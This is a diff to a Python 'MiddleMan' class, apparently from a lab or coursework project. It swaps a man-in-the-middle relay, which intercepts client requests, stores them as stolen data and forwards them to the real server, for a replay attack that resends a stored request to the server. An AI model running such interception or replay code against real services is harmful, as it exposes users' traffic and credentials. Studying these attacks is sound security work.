@@ -79,41 +79,20 @@ class MiddleMan:
 
     def run(self):
         print("waiting...")
-        connected_clients = []
-        while True:
-            attempts_to_connect, wlist, xlist = select.select([self.getSocketasServer()],[], [], 0.05)
+        # while True:
+        data = self.db.readMalicious()
+        print("replay attack happening")
+        self.getSocketasClient().sendto(data,(self.getTCP_IP(), self.getTCP_ASCLIENT_PORT()))
+        print("Request sent to legit server")
+        data = self.getSocketasClient().recv(self.getBUFFER_SIZE())
+        print("Got response from server")
+        print("data",data)
+            # conn.sendto(data,(self.getTCP_IP(), self.getTCP_ASCLIENT_PORT()))
+            # print("Sent server data to client")
 
-            for connections in attempts_to_connect:
-                conn, addr = self.getSocketasServer().accept()
-                connected_clients.append(conn)
-                print('Connection address:', addr)
-
-            clients_allowed = []
-            try:
-                clients_allowed, wlist, xlist = select.select(connected_clients,[], [], 0.05)
-            except select.error:
-                pass
-
-            else:
-                for conn in clients_allowed:
-                    data = conn.recv(self.getBUFFER_SIZE())
-                    print(data)
-                    if data:
-                        print("Recieved request from 'client' haha")
-                        error = self.db.writeMalicious(data)
-                        ret = self.e.send_err(error)
-                        if error == 0:
-                            print("stole client's information")
-                            self.getSocketasClient().sendto(data,(self.getTCP_IP(), self.getTCP_ASCLIENT_PORT()))
-                            print("Request sent to legit server")
-                            data = self.getSocketasClient().recv(self.getBUFFER_SIZE())
-                            print("Got response from server")
-                            conn.sendto(data,(self.getTCP_IP(), self.getTCP_ASSERVER_PORT()))
-                            print("Sent server data to client")
-
-                    else:
-                        print(conn.getsockname(), "disconnected")
-                        connected_clients.remove(conn)
+    # else:
+    #     print(conn.getsockname(), "disconnected")
+    #     connected_clients.remove(conn)
 
 if __name__ == "__main__":
     m = MiddleMan(ADDRESS_OF_SERVER,1024)
